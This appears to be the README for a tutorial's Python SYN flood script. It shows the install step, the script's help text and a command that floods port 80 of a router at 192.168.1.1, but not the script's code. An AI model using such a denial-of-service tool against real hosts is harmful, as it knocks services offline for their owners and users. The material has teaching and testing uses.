# [How to Make a SYN Flooding Attack in Python](https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python)
To run this:
- `pip3 install -r requirements.txt`
- Run help:
    ```
    python syn_flood.py --help
    ```
    **Output:**
    ```
    usage: syn_flood.py [-h] [-p PORT] target_ip

    Simple SYN Flood Script

    positional arguments:
    target_ip             Target IP address (e.g router's IP)

    optional arguments:
    -h, --help            show this help message and exit
    -p PORT, --port PORT  Destination port (the port of the target's machine
                            service, e.g 80 for HTTP, 22 for SSH and so on).
    ```
- To run this against your router's web interface that has the IP address of 192.168.1.1:
    ```
    python syn_flood.py -p 80 192.168.1.1
    ```